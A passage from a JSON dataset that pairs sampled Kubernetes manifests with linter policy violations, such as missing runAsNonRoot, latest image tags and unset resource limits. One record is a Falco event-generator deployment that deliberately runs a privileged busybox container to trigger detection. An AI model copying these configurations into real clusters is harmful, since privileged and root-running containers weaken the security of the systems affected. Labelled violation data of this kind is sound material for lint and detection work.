      containerPort: 8008\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"eventing-controller\" is using an invalid container image, \"ko://knative.dev/eventing/cmd/controller\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8143",
    "manifest_path": "data/manifests/the_stack_sample/sample_3019.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventing-controller\n  namespace: knative-eventing\n  labels:\n    eventing.knative.dev/release: devel\n    knative.dev/high-availability: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventing-controller\n  template:\n    metadata:\n      labels:\n        app: eventing-controller\n        eventing.knative.dev/release: devel\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app: eventing-controller\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: eventing-controller\n      containers:\n      - name: eventing-controller\n        image: ko://knative.dev/eventing/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/eventing\n        - name: MT_PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/mtping\n        - name: APISERVER_RA_IMAGE\n          value: ko://knative.dev/eventing/cmd/apiserver_receive_adapter\n        securityContext:\n          allowPrivilegeEscalation: false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"eventing-controller\" does not have a read-only root file system"
  },
  {
    "id": "8144",
    "manifest_path": "data/manifests/the_stack_sample/sample_3019.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventing-controller\n  namespace: knative-eventing\n  labels:\n    eventing.knative.dev/release: devel\n    knative.dev/high-availability: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventing-controller\n  template:\n    metadata:\n      labels:\n        app: eventing-controller\n        eventing.knative.dev/release: devel\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app: eventing-controller\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: eventing-controller\n      containers:\n      - name: eventing-controller\n        image: ko://knative.dev/eventing/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/eventing\n        - name: MT_PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/mtping\n        - name: APISERVER_RA_IMAGE\n          value: ko://knative.dev/eventing/cmd/apiserver_receive_adapter\n        securityContext:\n          allowPrivilegeEscalation: false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"eventing-controller\" not found"
  },
  {
    "id": "8145",
    "manifest_path": "data/manifests/the_stack_sample/sample_3019.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventing-controller\n  namespace: knative-eventing\n  labels:\n    eventing.knative.dev/release: devel\n    knative.dev/high-availability: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventing-controller\n  template:\n    metadata:\n      labels:\n        app: eventing-controller\n        eventing.knative.dev/release: devel\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app: eventing-controller\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: eventing-controller\n      containers:\n      - name: eventing-controller\n        image: ko://knative.dev/eventing/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/eventing\n        - name: MT_PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/mtping\n        - name: APISERVER_RA_IMAGE\n          value: ko://knative.dev/eventing/cmd/apiserver_receive_adapter\n        securityContext:\n          allowPrivilegeEscalation: false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"eventing-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "8146",
    "manifest_path": "data/manifests/the_stack_sample/sample_3019.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventing-controller\n  namespace: knative-eventing\n  labels:\n    eventing.knative.dev/release: devel\n    knative.dev/high-availability: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventing-controller\n  template:\n    metadata:\n      labels:\n        app: eventing-controller\n        eventing.knative.dev/release: devel\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchLabels:\n                  app: eventing-controller\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      serviceAccountName: eventing-controller\n      containers:\n      - name: eventing-controller\n        image: ko://knative.dev/eventing/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/eventing\n        - name: MT_PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/mtping\n        - name: APISERVER_RA_IMAGE\n          value: ko://knative.dev/eventing/cmd/apiserver_receive_adapter\n        securityContext:\n          allowPrivilegeEscalation: false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"eventing-controller\" has memory limit 0"
  },
  {
    "id": "8147",
    "manifest_path": "data/manifests/the_stack_sample/sample_3020.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app.kubernetes.io/part-of: prow\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210728-b79cedd058\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --continue-on-error=true\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"statusreconciler\" does not have a read-only root file system"
  },
  {
    "id": "8148",
    "manifest_path": "data/manifests/the_stack_sample/sample_3020.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app.kubernetes.io/part-of: prow\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210728-b79cedd058\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --continue-on-error=true\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"statusreconciler\" is not set to runAsNonRoot"
  },
  {
    "id": "8149",
    "manifest_path": "data/manifests/the_stack_sample/sample_3020.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app.kubernetes.io/part-of: prow\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210728-b79cedd058\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --continue-on-error=true\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"statusreconciler\" has cpu request 0"
  },
  {
    "id": "8150",
    "manifest_path": "data/manifests/the_stack_sample/sample_3020.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app.kubernetes.io/part-of: prow\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210728-b79cedd058\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --continue-on-error=true\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"statusreconciler\" has memory limit 0"
  },
  {
    "id": "8151",
    "manifest_path": "data/manifests/the_stack_sample/sample_3022.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: clase5\n  namespace: clase5\n  labels:\n    app: clase5\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: clase5\n  template:\n    metadata:\n      labels:\n        app: clase5\n    spec:\n      containers:\n      - name: hola-aws101\n        image: dolguin/hola-aws101:latest\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 80\n        env:\n        - name: NGINX_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: aws101-config\n              key: NGINX_PORT\n        - name: DATABASE_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: aws101-config\n              key: DATABASE_HOST\n        volumeMounts:\n        - name: config\n          mountPath: /etc/nginx/conf.d\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: aws101-config\n          items:\n          - key: default.conf\n            path: default.conf\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"hola-aws101\" is using an invalid container image, \"dolguin/hola-aws101:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8152",
    "manifest_path": "data/manifests/the_stack_sample/sample_3022.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: clase5\n  namespace: clase5\n  labels:\n    app: clase5\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: clase5\n  template:\n    metadata:\n      labels:\n        app: clase5\n    spec:\n      containers:\n      - name: hola-aws101\n        image: dolguin/hola-aws101:latest\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 80\n        env:\n        - name: NGINX_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: aws101-config\n              key: NGINX_PORT\n        - name: DATABASE_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: aws101-config\n              key: DATABASE_HOST\n        volumeMounts:\n        - name: config\n          mountPath: /etc/nginx/conf.d\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: aws101-config\n          items:\n          - key: default.conf\n            path: default.conf\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8153",
    "manifest_path": "data/manifests/the_stack_sample/sample_3022.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: clase5\n  namespace: clase5\n  labels:\n    app: clase5\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: clase5\n  template:\n    metadata:\n      labels:\n        app: clase5\n    spec:\n      containers:\n      - name: hola-aws101\n        image: dolguin/hola-aws101:latest\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 80\n        env:\n        - name: NGINX_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: aws101-config\n              key: NGINX_PORT\n        - name: DATABASE_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: aws101-config\n              key: DATABASE_HOST\n        volumeMounts:\n        - name: config\n          mountPath: /etc/nginx/conf.d\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: aws101-config\n          items:\n          - key: default.conf\n            path: default.conf\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hola-aws101\" does not have a read-only root file system"
  },
  {
    "id": "8154",
    "manifest_path": "data/manifests/the_stack_sample/sample_3022.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: clase5\n  namespace: clase5\n  labels:\n    app: clase5\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: clase5\n  template:\n    metadata:\n      labels:\n        app: clase5\n    spec:\n      containers:\n      - name: hola-aws101\n        image: dolguin/hola-aws101:latest\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 80\n        env:\n        - name: NGINX_PORT\n          valueFrom:\n            configMapKeyRef:\n              name: aws101-config\n              key: NGINX_PORT\n        - name: DATABASE_HOST\n          valueFrom:\n            configMapKeyRef:\n              name: aws101-config\n              key: DATABASE_HOST\n        volumeMounts:\n        - name: config\n          mountPath: /etc/nginx/conf.d\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: aws101-config\n          items:\n          - key: default.conf\n            path: default.conf\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hola-aws101\" is not set to runAsNonRoot"
  },
  {
    "id": "8155",
    "manifest_path": "data/manifests/the_stack_sample/sample_3023.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4239\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8156",
    "manifest_path": "data/manifests/the_stack_sample/sample_3023.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4239\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8157",
    "manifest_path": "data/manifests/the_stack_sample/sample_3023.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4239\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8158",
    "manifest_path": "data/manifests/the_stack_sample/sample_3023.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4239\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8159",
    "manifest_path": "data/manifests/the_stack_sample/sample_3023.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4239\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8160",
    "manifest_path": "data/manifests/the_stack_sample/sample_3024.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: mongo\nspec:\n  selector:\n    matchLabels:\n      app: mongo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - name: mongodb\n        image: mongo:4.2\n        command:\n        - mongod\n        - --replSet\n        - rs0\n        ports:\n        - containerPort: 27017\n          name: peer\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8161",
    "manifest_path": "data/manifests/the_stack_sample/sample_3024.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: mongo\nspec:\n  selector:\n    matchLabels:\n      app: mongo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - name: mongodb\n        image: mongo:4.2\n        command:\n        - mongod\n        - --replSet\n        - rs0\n        ports:\n        - containerPort: 27017\n          name: peer\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mongodb\" does not have a read-only root file system"
  },
  {
    "id": "8162",
    "manifest_path": "data/manifests/the_stack_sample/sample_3024.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: mongo\nspec:\n  selector:\n    matchLabels:\n      app: mongo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - name: mongodb\n        image: mongo:4.2\n        command:\n        - mongod\n        - --replSet\n        - rs0\n        ports:\n        - containerPort: 27017\n          name: peer\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mongodb\" is not set to runAsNonRoot"
  },
  {
    "id": "8163",
    "manifest_path": "data/manifests/the_stack_sample/sample_3024.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: mongo\nspec:\n  selector:\n    matchLabels:\n      app: mongo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - name: mongodb\n        image: mongo:4.2\n        command:\n        - mongod\n        - --replSet\n        - rs0\n        ports:\n        - containerPort: 27017\n          name: peer\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mongodb\" has cpu request 0"
  },
  {
    "id": "8164",
    "manifest_path": "data/manifests/the_stack_sample/sample_3024.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: mongo\nspec:\n  selector:\n    matchLabels:\n      app: mongo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - name: mongodb\n        image: mongo:4.2\n        command:\n        - mongod\n        - --replSet\n        - rs0\n        ports:\n        - containerPort: 27017\n          name: peer\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mongodb\" has memory limit 0"
  },
  {
    "id": "8165",
    "manifest_path": "data/manifests/the_stack_sample/sample_3025.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: team-exportor\n  name: team-exportor\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: team-exportor\n  template:\n    metadata:\n      labels:\n        app: team-exportor\n    spec:\n      containers:\n      - image: quay.io/eparis/team-exportor:latest\n        imagePullPolicy: Always\n        name: team-exportor\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/github/\n          name: github-api-key\n          readOnly: true\n        - mountPath: /var/run/\n          name: team-overwrite\n          readOnly: true\n        - mountPath: /etc/google-sheet/\n          name: gsheet-key\n        ports:\n        - name: web\n          containerPort: 8000\n          protocol: TCP\n      volumes:\n      - name: github-api-key\n        secret:\n          defaultMode: 420\n          secretName: github-api-key\n      - name: team-overwrite\n        configMap:\n          defaultMode: 420\n          name: overwrite-team-data\n      - name: gsheet-key\n        secret:\n          defaultMode: 420\n          secretName: gsheet-key\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"team-exportor\" is using an invalid container image, \"quay.io/eparis/team-exportor:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8166",
    "manifest_path": "data/manifests/the_stack_sample/sample_3025.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: team-exportor\n  name: team-exportor\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: team-exportor\n  template:\n    metadata:\n      labels:\n        app: team-exportor\n    spec:\n      containers:\n      - image: quay.io/eparis/team-exportor:latest\n        imagePullPolicy: Always\n        name: team-exportor\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/github/\n          name: github-api-key\n          readOnly: true\n        - mountPath: /var/run/\n          name: team-overwrite\n          readOnly: true\n        - mountPath: /etc/google-sheet/\n          name: gsheet-key\n        ports:\n        - name: web\n          containerPort: 8000\n          protocol: TCP\n      volumes:\n      - name: github-api-key\n        secret:\n          defaultMode: 420\n          secretName: github-api-key\n      - name: team-overwrite\n        configMap:\n          defaultMode: 420\n          name: overwrite-team-data\n      - name: gsheet-key\n        secret:\n          defaultMode: 420\n          secretName: gsheet-key\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"team-exportor\" does not have a read-only root file system"
  },
  {
    "id": "8167",
    "manifest_path": "data/manifests/the_stack_sample/sample_3025.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: team-exportor\n  name: team-exportor\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: team-exportor\n  template:\n    metadata:\n      labels:\n        app: team-exportor\n    spec:\n      containers:\n      - image: quay.io/eparis/team-exportor:latest\n        imagePullPolicy: Always\n        name: team-exportor\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/github/\n          name: github-api-key\n          readOnly: true\n        - mountPath: /var/run/\n          name: team-overwrite\n          readOnly: true\n        - mountPath: /etc/google-sheet/\n          name: gsheet-key\n        ports:\n        - name: web\n          containerPort: 8000\n          protocol: TCP\n      volumes:\n      - name: github-api-key\n        secret:\n          defaultMode: 420\n          secretName: github-api-key\n      - name: team-overwrite\n        configMap:\n          defaultMode: 420\n          name: overwrite-team-data\n      - name: gsheet-key\n        secret:\n          defaultMode: 420\n          secretName: gsheet-key\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"team-exportor\" is not set to runAsNonRoot"
  },
  {
    "id": "8168",
    "manifest_path": "data/manifests/the_stack_sample/sample_3025.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: team-exportor\n  name: team-exportor\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: team-exportor\n  template:\n    metadata:\n      labels:\n        app: team-exportor\n    spec:\n      containers:\n      - image: quay.io/eparis/team-exportor:latest\n        imagePullPolicy: Always\n        name: team-exportor\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/github/\n          name: github-api-key\n          readOnly: true\n        - mountPath: /var/run/\n          name: team-overwrite\n          readOnly: true\n        - mountPath: /etc/google-sheet/\n          name: gsheet-key\n        ports:\n        - name: web\n          containerPort: 8000\n          protocol: TCP\n      volumes:\n      - name: github-api-key\n        secret:\n          defaultMode: 420\n          secretName: github-api-key\n      - name: team-overwrite\n        configMap:\n          defaultMode: 420\n          name: overwrite-team-data\n      - name: gsheet-key\n        secret:\n          defaultMode: 420\n          secretName: gsheet-key\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"team-exportor\" has cpu request 0"
  },
  {
    "id": "8169",
    "manifest_path": "data/manifests/the_stack_sample/sample_3025.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: team-exportor\n  name: team-exportor\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: team-exportor\n  template:\n    metadata:\n      labels:\n        app: team-exportor\n    spec:\n      containers:\n      - image: quay.io/eparis/team-exportor:latest\n        imagePullPolicy: Always\n        name: team-exportor\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/github/\n          name: github-api-key\n          readOnly: true\n        - mountPath: /var/run/\n          name: team-overwrite\n          readOnly: true\n        - mountPath: /etc/google-sheet/\n          name: gsheet-key\n        ports:\n        - name: web\n          containerPort: 8000\n          protocol: TCP\n      volumes:\n      - name: github-api-key\n        secret:\n          defaultMode: 420\n          secretName: github-api-key\n      - name: team-overwrite\n        configMap:\n          defaultMode: 420\n          name: overwrite-team-data\n      - name: gsheet-key\n        secret:\n          defaultMode: 420\n          secretName: gsheet-key\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"team-exportor\" has memory limit 0"
  },
  {
    "id": "8170",
    "manifest_path": "data/manifests/the_stack_sample/sample_3027.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: matl-online\n  namespace: matl-online\nspec:\n  selector:\n    app: matl-online\n    role: web\n  ports:\n  - port: 5000\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:matl-online role:web])"
  },
  {
    "id": "8171",
    "manifest_path": "data/manifests/the_stack_sample/sample_3028.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: tomcat-lb\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 8080\n    name: tomcat\n  selector:\n    app: tomcat\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:tomcat])"
  },
  {
    "id": "8172",
    "manifest_path": "data/manifests/the_stack_sample/sample_3029.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: privileged-deployment\n  labels:\n    app.kubernetes.io/name: privileged-deployment\n    app.kubernetes.io/part-of: falco-event-generator\n    falco.rules: Create-Privileged-Pod\n    message: Creating-deployment-with-privileged-true-pod\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: privileged-busybox\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: privileged-busybox\n        app.kubernetes.io/part-of: falco-event-generator\n    spec:\n      containers:\n      - securityContext:\n          privileged: true\n        name: busybox\n        image: busybox\n        command:\n        - /bin/sh\n        - -c\n        - while true; do echo sleeping; sleep 3600; done\n",
    "policy_id": "latest-tag",
